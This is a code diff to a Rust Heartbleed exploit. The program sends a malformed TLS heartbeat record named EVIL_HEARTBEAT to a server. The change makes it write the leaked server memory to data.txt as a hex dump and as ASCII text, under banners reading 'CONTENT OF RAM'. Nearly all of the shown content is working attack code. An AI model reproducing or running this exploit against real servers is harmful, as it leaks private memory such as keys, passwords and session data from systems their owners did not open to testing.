@@ -6,8 +6,6 @@ use std::{
     net::TcpStream,
 };
 
-use hex;
-
 const EVIL_HEARTBEAT: [u8; 12] = [
     0x18, //content type, 0x18 means heartbeat
     0x03, 0x02, //tls version
@@ -85,6 +83,8 @@ fn main() -> Result<(), Box<dyn Error>> {
     tcp_stream.write_all(&EVIL_HEARTBEAT)?;
     tcp_stream.flush()?;
 
+    let mut file = File::create("data.txt")?;
+
     //check for heartbeat response
     loop {
         //read header
@@ -106,11 +106,21 @@ fn main() -> Result<(), Box<dyn Error>> {
             let mut data = vec![0; data_length as usize];
             tcp_stream.read_exact(&mut data)?;
 
-            //dump data
+            //dump data to file
             println!("Dumping data to data.txt in hex format.");
-            let mut file = File::create("data.txt")?;
 
-            file.write_all(hex::encode(&data).as_bytes())?;
+            //dump in hex repr
+            write!(file, "\n========= CONTENT OF RAM IN HEX =========\n");
+            for d in &data {
+                write!(file, "{:X}", *d)?;
+            }
+
+            //dump in ascii repr
+            write!(file, "\n========= CONTENT OF RAM IN ASCII =========\n");
+            for d in &data {
+                write!(file, "{}", *d as char)?;
+            }
+
         }
     }
 
